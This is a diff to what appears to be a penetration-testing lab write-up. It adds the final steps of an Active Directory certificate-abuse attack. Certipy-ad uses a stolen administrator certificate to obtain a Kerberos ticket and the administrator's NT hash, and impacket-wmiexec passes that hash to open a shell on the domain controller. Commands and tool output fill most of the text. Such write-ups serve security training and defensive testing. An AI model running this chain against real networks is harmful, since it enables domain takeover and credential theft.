@@ -803,10 +803,36 @@ jeff@kali:~$ ls -al administrator.pfx
 
 => Finally, collect the password hash of the Domain Admin account "Company\Administrator" and then log into the DC as "Domain Admin" using "impacket-wmiexec"
 
-jeff@kali:~$ certipy-ad auth -pfx administrator.pfx -domain company.work -username administrator -dc-ip 192.168.1.167
+jeff@kali:~$ certipy-ad auth -pfx /home/jeff/administrator.pfx -domain company.work -username administrator -dc-ip 192.168.1.167
+
 Certipy v4.3.0 - by Oliver Lyak (ly4k)
 
 [*] Using principal: administrator@company.work
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@company.work': aad3b435b51404eeaad3b435b51404ee:cf3a5525ee94142<SNIP>
+
+
+jeff@kali:~$ impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414<SNIP> administrator@192.168.1.167
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+
+C:\> hostname
+DC1
+
+C:\> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name             SID                                         
+===================== ============================================
+company\administrator S-1-5-21-844310393-2305947092-3799914435-500
+<SNIP>
 
 
 --------------------------------------------------------------------------------------------------------------------
